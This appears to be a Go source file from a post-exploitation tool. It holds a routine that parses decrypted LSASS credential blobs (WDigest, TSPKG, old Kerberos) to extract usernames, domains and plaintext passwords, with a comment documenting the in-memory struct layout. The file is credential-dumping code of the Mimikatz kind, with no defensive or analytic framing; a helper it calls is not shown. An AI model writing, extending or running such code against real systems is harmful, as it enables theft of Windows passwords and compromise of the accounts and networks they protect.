package commands

// Plaintext credential parsing for LSASS in-situ extraction.
//
// WDigest, TSPKG, and old Kerberos entries in the KIWI_MSV1_0_PRIMARY_CREDENTIALS
// chain all share the same 3-LSA_UNICODE_STRING layout:
//
//	+0x00  UserName  (LSA_UNICODE_STRING, 16 bytes)
//	+0x10  Domain    (LSA_UNICODE_STRING, 16 bytes)
//	+0x20  Password  (LSA_UNICODE_STRING, 16 bytes)
//	total header: 0x30 = 48 bytes
//
// After decryption, the inline string data follows the header. The strings
// are extracted by computing offsets from the Buffer pointers relative to
// blobBase (the LSASS-virtual address of the encrypted blob).

import "fmt"

const plaintextCredHeaderSize = 0x30

// plaintextCredential is the parsed result of a WDigest/TSPKG credential blob.
type plaintextCredential struct {
	UserName    string
	Domain      string
	Password    string
	PasswordLen uint16
	ParseErrors []string
}

// parsePlaintextCredential parses a decrypted WDigest/TSPKG/old-Kerberos
// credential blob that contains 3 inline LSA_UNICODE_STRING fields.
func parsePlaintextCredential(plaintext []byte, blobBase uintptr) plaintextCredential {
	var cred plaintextCredential
	if len(plaintext) < plaintextCredHeaderSize {
		cred.ParseErrors = append(cred.ParseErrors,
			fmt.Sprintf("plaintext too short: got %d, need >= %d", len(plaintext), plaintextCredHeaderSize))
		return cred
	}

	cred.UserName, _ = extractInlineUnicodeString(plaintext, 0x00, blobBase)
	cred.Domain, _ = extractInlineUnicodeString(plaintext, 0x10, blobBase)
	cred.Password, cred.PasswordLen = extractInlineUnicodeString(plaintext, 0x20, blobBase)
	return cred
}
